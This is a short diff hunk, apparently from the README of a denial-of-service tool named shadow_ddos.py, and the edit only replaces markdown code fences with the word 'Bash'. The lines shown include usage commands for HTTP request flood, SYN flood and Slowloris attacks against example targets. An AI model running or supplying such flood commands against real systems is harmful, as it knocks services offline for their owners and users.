@@ -33,11 +33,11 @@ HTTP Request Flood:
 python shadow_ddos.py -d [www.example.com](https://www.example.com) -T 2000 -Request
 SYN Flood (Requires Root/Sudo):
 
-```bash
+Bash
 sudo python shadow_ddos.py -d 192.168.1.1 -T 5000 -Synflood
 Slowloris Attack (Pyslow):
 
-```bash
+Bash
 python shadow_ddos.py -d [www.example.com](https://www.example.com) -p 80 -T 500 -Pyslow
 
 📊 Technical Overview
